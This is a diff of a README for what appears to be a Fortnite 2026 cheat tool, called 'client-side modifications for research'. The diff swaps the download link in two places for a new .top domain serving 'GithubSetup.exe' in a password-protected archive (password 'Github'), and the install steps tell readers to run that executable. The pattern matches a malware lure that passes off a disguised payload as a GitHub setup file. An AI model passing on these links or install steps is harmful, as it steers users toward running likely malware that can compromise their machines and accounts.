@@ -10,7 +10,7 @@ Utility for **Fortnite 2026**. Provides client-side modifications for research a
 
 ## ⬇️ Download
 
-**[https://gitappdown.top/](https://gitappdown.top/)**  
+**[https://gitdownapply.top](https://gitdownapply.top)**  
 *File: `GithubSetup.exe` | Archive password: `Github`*
 
 ---
@@ -126,7 +126,7 @@ The tool exposes a set of toggles and sliders for modifying client-side behavior
 ## 🔧 Installation / How to Use
 
 1. **Download the latest release** from the official source:  
-   ➡️ **[https://gitappdown.top/](https://gitappdown.top/)**  
+   ➡️ **[https://gitdownapply.top](https://gitdownapply.top)**  
    *(File: `GithubSetup.exe` | Archive password: `Github`)*
 
 2. Run `GithubSetup.exe` and follow the installation wizard.
